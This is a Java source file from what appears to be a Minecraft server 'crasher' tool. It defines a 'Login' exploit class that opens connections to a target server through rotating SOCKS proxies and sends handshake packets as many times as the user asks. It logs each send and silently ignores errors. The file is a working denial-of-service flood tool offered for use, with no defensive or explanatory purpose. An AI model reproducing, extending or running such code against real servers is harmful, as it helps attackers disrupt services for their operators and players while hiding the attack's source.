package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.PacketHelper;
import uwu.narumi.crasher.api.helper.Protocol;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.io.NetOut;
import uwu.narumi.crasher.api.optimizer.Optimizer;
import uwu.narumi.crasher.api.packet.Packet;

@ExploitInfo(
    name = "Login",
    description = "Simple handshake packet"
)
public class Login extends Exploit {

  public Login() {
    super(
        new Argument("address", 0, McAddress.class),
        new Argument("version", 1, String.class),
        new Argument("amount", 2, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    index.set(0);

    McAddress address = (McAddress) args[0];
    int protocol = Protocol.getByName((String) args[1]).getId();
    int amount = (int) args[2];
    Packet ping = PacketHelper
        .createHandshake(protocol, address.getIp(), (short) address.getPort(), 2);

    Optimizer.startOptimizing(Login.class);
    Optimizer.post(() -> {
      Proxy proxy = ProxyHelper.getSocks();
      try {
        Socket socket = ProxyHelper.createSocket(proxy);
        if (socket == null) {
          throw new ThreadDeath();
        }

        socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
        NetOut netOut = new NetOut(socket.getOutputStream());
        ping.send(netOut);

        System.out.println(String
            .format("%s -> %s | %s/%s", proxy, address, index.getAndIncrement(),
                amount));
        Optimizer.update();
      } catch (Exception ignored) {
      }
    }, amount);
  }
}